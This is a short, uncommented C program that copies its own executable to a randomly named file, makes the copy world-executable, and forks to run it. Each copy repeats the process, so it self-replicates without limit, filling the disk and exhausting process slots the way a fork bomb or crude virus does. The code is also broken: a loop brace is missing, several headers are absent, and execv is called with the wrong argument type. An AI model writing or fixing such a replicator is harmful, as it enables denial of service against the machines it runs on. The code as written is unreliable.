#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

#define N_LEN 9

void rand_name(char *string, unsigned int len) {
		// setting a seed for rand()
		srand((unsigned int) time(0) + getpid());

		int i;
		unsigned int n_chars = len - 1;
		for(i = 0;i < n_chars;) {
				int random = rand() % (126 - 33 + 1) + 33;
				if((random > 64 && random < 90) || (random > 96 && random < 123)) {
						string[i] = tolower(random);
						i++;
				}

		string[n_chars] = '\0';
}

int main(int argc, char **argv) {

	char file_name[10];
	rand_name(file_name,N_LEN);
	
	int input = open(argv[0], O_RDONLY);
	int copy = open(file_name, O_CREAT | O_WRONLY);

	char buf[1];

	while(read(input,buf,sizeof(char))) {
			write(copy,buf,sizeof(char));
	}

	close(input);
	close(copy);

	chmod(file_name,0777);
	int pid = fork();

	if(pid < 0) {
			//failed
	} else if(pid == 0) {
	execv(file_name,"");
	} else {
			wait(NULL);
	}

	return 0;
}
	
